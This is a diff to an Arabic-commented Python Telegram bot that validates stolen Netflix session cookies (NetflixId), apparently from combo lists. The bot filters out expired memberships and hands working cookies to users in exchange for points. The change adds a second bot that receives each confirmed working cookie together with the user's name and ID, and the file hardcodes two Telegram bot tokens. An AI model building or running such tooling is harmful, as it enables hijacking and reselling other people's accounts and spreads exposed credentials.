@@ -11,9 +11,13 @@ from datetime import datetime
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from urllib3.exceptions import InsecureRequestWarning
 
-# --- إعدادات البوت والتوكن ---
+# --- إعدادات البوت الأساسي ---
 TOKEN = '8890151932:AAEfgjjTsnSf7I4WIE_Y2VptjrkbotRaVvA'
 bot = telebot.TeleBot(TOKEN)
+
+# 🤖 بوت الإشعارات الثاني المخصص لتلقي الكوكيز الشغال فقط
+SECOND_BOT_TOKEN = '8355346917:AAF-ipNA2BagCeZ7L0qTx5-6_pTEv3xPFWk'
+notification_bot = telebot.TeleBot(SECOND_BOT_TOKEN)
 
 # 👑 إعدادات المطور الخاصة بك (فارس)
 DEVELOPER_CHAT_ID = 8713916851
@@ -97,6 +101,12 @@ def check_netflix_cookie_detailed(netflix_id):
             expires = account_info.get("expires")
             
             if token:
+                # 🛑 فلترة متقدمة لمنع الحسابات المنتهية أو التي تتطلب إعادة اشتراك (مثل Restart Membership)
+                current_status = value_data.get("currentStatus", {})
+                membership_status = str(current_status.get("membershipStatus", "")).upper()
+                if "EXPIRED" in membership_status or "CANCELED" in membership_status or "UNSUBSCRIBED" in membership_status:
+                    return None
+
                 plan_info = value_data.get("currentPlan", {}) or value_data.get("plan", {})
                 plan_name = str(plan_info).lower()
                 
@@ -426,10 +436,7 @@ def execute_dispense_logic(chat_id):
                 InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}")
             )
             
-            if current_cookie not in VALID_COOKIES_POOL:
-                VALID_COOKIES_POOL.append(current_cookie)
-                
-            return {"status": "success", "text": success_text, "markup": user_markup}
+            return {"status": "success", "text": success_text, "markup": user_markup, "cookie": current_cookie}
         else:
             continue
             
@@ -455,6 +462,9 @@ def dispense_account_on_button(call):
     
     if response["status"] == "success":
         bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
+        if not hasattr(bot, 'active_dispensed_cookies'):
+            bot.active_dispensed_cookies = {}
+        bot.active_dispensed_cookies[chat_id] = response["cookie"]
     elif response["status"] == "no_points":
         bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! يرجى التواصل مع فارس لشحن رصيدك.", reply_markup=generate_main_keyboard(chat_id))
     else:
@@ -478,17 +488,15 @@ def pool_status(call):
 def handle_user_feedback(call):
     global VALID_COOKIES_POOL
     data_parts = call.data.split('_')
-    action, short_id = data_parts[1], data_parts[2]
+    action = data_parts[1] 
     
     user_info = call.from_user
     username = f"@{user_info.username}" if user_info.username else "لا يوجد"
     chat_id = call.message.chat.id
     
     target_cookie = None
-    for cookie in VALID_COOKIES_POOL:
-        if cookie.startswith(short_id):
-            target_cookie = cookie
-            break
+    if hasattr(bot, 'active_dispensed_cookies') and chat_id in bot.active_dispensed_cookies:
+        target_cookie = bot.active_dispensed_cookies.pop(chat_id, None)
 
     if action == "yes":
         bot.answer_callback_query(call.id, "شكراً على تقييمك! مشاهدة ممتعة 🍿🔥", show_alert=True)
@@ -497,36 +505,25 @@ def handle_user_feedback(call):
         except Exception: 
             pass
         
+        # 🚀 إرسال إشعار الكوكيز الناجح إلى بوت الإشعارات الثاني حصرياً
         if target_cookie:
-            dev_log_text = f"👑 **سحب ناجح!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
+            dev_log_text = f"👑 **سحب ناجح ومؤكد!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
             try: 
-                bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
-            except Exception: 
-                pass
+                notification_bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
+            except Exception as e: 
+                print(f"Error sending to second bot: {e}")
         
     elif action == "no":
+        bot.answer_callback_query(call.id, "⚠️ تم حذف الكوكيز التالف نهائياً من الذاكرة لعدم عمله.", show_alert=True)
+        
+        # حذف الكوكيز التالف بصمت ودون إرسال أي إشعارات عنه نهائياً
         if target_cookie and target_cookie in VALID_COOKIES_POOL:
             VALID_COOKIES_POOL.remove(target_cookie)
-            bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف، جاري تعويضك فوراً...", show_alert=True)
-            try: 
-                bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
-            except Exception: 
-                pass
-        else:
-            bot.answer_callback_query(call.id, "👌 تم تصفية هذا الحساب مسبقاً، جاري استخراج بديل لك...", show_alert=False)
             
         try: 
-            bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب جديد لك فوراً وخصم 1 نقطة... ⏳", chat_id, call.message.message_id, reply_markup=None)
+            bot.edit_message_text("❌ تم الإبلاغ بنجاح وحذف هذا الكوكيز التالف نهائياً من الذاكرة حتى لا يتكرر إرساله! شكراً لمساعدتك.", chat_id, call.message.message_id, reply_markup=None)
         except Exception: 
             pass
-
-        response = execute_dispense_logic(chat_id)
-        if response["status"] == "success":
-            bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
-        elif response["status"] == "no_points":
-            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! لا يمكن تعويضك بحساب جديد تلقائياً حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
-        else:
-            bot.send_message(chat_id, response["message"])
 
 def open_admin_panel_msg(chat_id):
     markup = InlineKeyboardMarkup()
@@ -688,7 +685,7 @@ def handle_plain_text(message):
     process_cookies_list_and_check(message.chat.id, extracted_ids, message.message_id, source_name="Combo_Text.txt")
 
 if __name__ == "__main__":
-    print("🚀 تم تشغيل البوت بنجاح وهو نظيف تماماً وخالٍ من الاشتراكات الإجبارية والقنوات...")
+    print("🚀 تم تحديث البوت بالكامل مع الفلترة الذكية للحسابات واستبعاد المنتهية بنجاح...")
     while True:
         try: 
             bot.polling(none_stop=True, skip_pending=True)
